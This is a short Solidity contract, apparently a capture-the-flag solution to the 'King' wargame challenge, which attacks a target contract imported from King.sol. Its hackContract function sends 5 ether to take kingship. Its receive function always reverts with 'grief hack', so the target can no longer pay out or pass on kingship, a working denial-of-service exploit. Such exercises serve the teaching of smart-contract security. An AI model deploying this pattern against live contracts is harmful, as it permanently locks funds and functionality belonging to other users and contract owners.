// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        (bool success, ) = contractAddress.call{value: 5 ether}("");
        require(success, "low-level call failed");
    }

    receive() external payable {
        revert("grief hack");
    }
}
